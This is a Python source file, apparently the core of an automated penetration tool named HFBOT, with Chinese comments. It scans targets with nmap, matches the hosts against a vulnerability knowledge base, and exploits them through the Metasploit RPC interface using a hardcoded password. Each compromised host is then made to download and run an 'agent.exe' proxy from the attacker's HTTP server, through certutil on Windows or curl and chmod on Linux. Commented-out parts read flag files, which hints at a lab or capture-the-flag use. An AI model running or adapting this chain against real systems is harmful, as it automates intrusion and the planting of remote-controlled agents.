# -*- coding: utf-8 -*
from botnmapscan import nmap_scan
from vulneriablity import VULNERIABLITY
from pymetasploit3.msfrpc import MsfRpcClient
import socket
from vul_kb import VUL_KB
from others import color
import argparse
from host import HOST
import os
import sys
import subprocess
import logging

# log
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
handler = logging.FileHandler(os.path.basename(__file__)[:-3]+".log", mode='a')
formatter = logging.Formatter("%(asctime)s -  %(levelname)s - %(message)s")
handler.setFormatter(formatter)
logger.addHandler(handler)
# log


def DownloadFile(ip,os="windows",port=5678):
    command = ''
    if os == "windows":
        command = "certutil -urlcache -split -f http://%s:8000/agent.exe && start /b agent.exe -lport %s"%(ip,str(5678))
    elif os == "linux" or os == "linux_x64":
        command = "curl -o agent_linux_x64 http://%s:8000/agent.exe;chmod +x agent;./agent -lport %s"%(ip,str(5678))
    elif os == "linux_x86":
        command = "curl -o agent_linux_x86 http://%s:8000/agent.exe;chmod +x agent;./agent -lport %s"%(ip,str(5678))
    return command

sys.path.append(" ../")
from AutoProxy.autoproxy.core import AutoProxy
autoproxy = AutoProxy()
# def DownloadFile(ip,os="windows",port=5555):
#         if os == "windows":
#             command = "certutil -urlcache -split -f http://%s:8000/agent.exe && agent.exe -lport %s"%(ip,str(5555))
#         elif os == "linux" or os == "linux_x64":
#             command = "curl -o agent_linux_x64 http://%s:8000/agent_linux_x64;chmod +x agent;./agent -lport %s"%(ip,str(5555))
#         elif os == "linux_x86":
#             command = "curl -o agent_linux_x86 http://%s:8000/agent_linux_x86;chmod +x agent;./agent -lport %s"%(ip,str(5555))
#         return command



def get_host_ip():
    """
    查询本机ip地址
    :return: ip
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    finally:
        s.close()
    return ip

def open_msfrpcd_http():###存在问题，目前需要手动执行msfrpcd: msfrpcd -S -P hfbot
    from requests.exceptions import ConnectionError
    try:
        client = MsfRpcClient('hfbot',ssl='False')#开启msfrpcd: msfrpcd -S -P hfbot
    except ConnectionError as e:
        os.system("msfrpcd -S -P hfbot")
        client = MsfRpcClient('hfbot',ssl='False')
    return client

    ###开启msfrpc
try:
    #os.system("cd /home/kali/HFBOT/HFBOT/utils/AutoProxy/autoproxy/venom/ && python3 -m http.server 8000")
    subprocess.Popen('cd /home/kali/HFBOT/HFBOT/utils/Attack/AutoProxy/autoproxy/venom && python3 -m http.server 8000', shell=True)
except:
    logger.info("http服务开启错误")
logger.info("http服务开启")

try:
    subprocess.Popen("cd ~/HFBOT/HFBOT/utils/Attack/beat && python3 beat_main.py",shell = True)
except:
    logger.info("心跳文件开启错误")
logger.info("心跳文件开启")

parser = argparse.ArgumentParser()
parser.add_argument("-t", type=str,dest='target', default='192.168.199.132', required=False, help="Target ip")
###########################################################################################

"""
获取命令行输入的参数
""" 
# parser = argparse.ArgumentParser() 
# parser.add_argument("-t", type=str,dest='target', default='', required=True, help="Target ip")
args = parser.parse_args()
target_ip = str(args.target) 

compromised_target=[]###当前已经获取权限的
uncompromised_target=[]###发现但未获取权限的
# 获取本机计算机名称
hostname = socket.gethostname()
# 获取本机ip
local_ip = get_host_ip()
client=open_msfrpcd_http()
#client = MsfRpcClient('hfbot',ssl='False')#开启msfrpcd: msfrpcd -S -P hfbot
#target_ip='192.168.192.159 192.168.192.156'  
#target_ip='10.30.1.10'
colour=color()


###########################################################################################

'''基本信息扫描'''
scan_dict=nmap_scan(target_ip,'-A')
for key in scan_dict:
    host_info={}
    host_info['ip']=key
    host_info['port']=scan_dict[key]["port_list"]
    host_info['os']=scan_dict[key]["os"][0]
    host_info['service']=scan_dict[key]["services_list"]
    kb=VUL_KB()
    web_vul_list,system_vul_list=kb.match_vuls(host_info) # 匹配漏洞
    all_vul=web_vul_list+system_vul_list

    # if all_vul == []:  # 需要加入所有游动利用失败的判定条件 changed by hdd
    #     wp_vul_list = kb.match_weak_password(host_info)

    host_info['vul']=all_vul
    h=HOST(host_info)
    uncompromised_target.append(h)
    '''
    选择攻击目标
    '''
for target in uncompromised_target:
    if 'Windows' in target.host_os:
        targetOS = 'windows'
    else:
        targetOS = 'linux'
    command=autoproxy.DownloadFile(ip=local_ip,os=targetOS)
    if target.attack(client,local_ip,command):
        ###如何判断代理有没有启动
        #flag=autoproxy.ReadFlag(ip=target.host_ip,os=targetOS)
        #logger.info(flag)
        compromised_target.append(target)
        uncompromised_target.remove(target)


# '''
# 目标主机选择模块
# '''
# for key in scan_dict:
#     # if key in compromised_target:
#     #     continue
#     logger.info(key + "的扫描结果如下所示")
#     logger.info("开放的端口")
#     logger.info(scan_dict[key]["port_list"])
#     logger.info("服务列表")
#     logger.info(scan_dict[key]["services_list"])
#     logger.info("操作系统")
#     logger.info(scan_dict[key]["os"])
#     logger.info("Host如下所示")
#     logger.info(scan_dict[key]["host"])
#     logger.info("NetBIOS name如下所示")
#     logger.info(scan_dict[key]["netbiosname"])
    
#     target_ip=key
#     port_list=scan_dict[key]["port_list"]
#     services_list=scan_dict[key]["services_list"]
#     os=scan_dict[key]["os"][0]

#     kb=VUL_KB()
#     web_vul_list,system_vul_list,wp_vul_list=kb.match_vuls(port_list,services_list,os)
#     all_vul=web_vul_list+system_vul_list
#     if os.find('Windows')!=-1:
#         command=r'cat "c:\flag.txt"'
#         #command='cat'
#     else:
#         command=r'"cat /flag"'
#     command='whoami'
    
#     colour.print_color('target '+key+' 漏洞列表如下：',colour.CYAN)
#     for vul in all_vul:
#         colour.print_color(vul.vul_name,colour.BOLD)
#     '''
#     漏洞选择模块
#     '''
#     for vul in all_vul:

#         if target_ip in compromised_target:
#             continue
#         result=vul.start_exp(client,local_ip,target_ip,command)
#         if result==1:
#             colour.print_color('success exploit '+vul.vul_name,colour.YELLOW)
#             compromised_target.append(key)
#         else:
#             colour.print_color('failed exploit '+vul.vul_name,colour.RED)


